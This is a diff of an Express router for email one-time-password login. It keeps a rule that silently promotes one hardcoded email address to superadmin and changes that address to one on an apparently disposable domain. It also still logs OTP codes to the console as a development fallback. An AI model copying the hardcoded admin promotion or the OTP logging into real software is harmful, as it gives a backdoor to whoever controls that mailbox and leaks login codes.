@@ -34,14 +34,17 @@ router.post('/send-otp', async (req, res) => {
         const newOtp = new Otp({ email, otp: generatedOtp });
         await newOtp.save();
 
-        // Send OTP via email using nodemailer (uncomment to activate real email sending)
-        // Note: For a real hackathon project, add real Gmail app passwords in .env
-        console.log(`[DEV MODE] Generated OTP for ${email}: ${generatedOtp}`);
-
+        // Send OTP via email
         try {
             await sendOtpEmail(email, generatedOtp);
+            console.log(`OTP email sent to ${email}`);
         } catch (e) {
-            console.log("Could not send real email. Fallback: Check console for OTP.");
+            console.error('Email sending failed:', e.message);
+            if (process.env.NODE_ENV === 'production') {
+                return res.status(500).json({ message: 'Failed to send OTP email. Please try again.' });
+            }
+            // Dev fallback — OTP is already logged to console above
+            console.log(`[DEV FALLBACK] OTP for ${email}: ${generatedOtp}`);
         }
 
         res.status(200).json({ message: 'OTP sent successfully to email' });
@@ -84,7 +87,7 @@ router.post('/verify-otp', async (req, res) => {
         }
 
         // Auto-Promote to superadmin
-        if (user.email === 'viveks3931@gmail.com' && user.role !== 'superadmin') {
+        if (user.email === 'ceyim98543@cslua.com' && user.role !== 'superadmin') {
             user.role = 'superadmin';
             await user.save();
         }
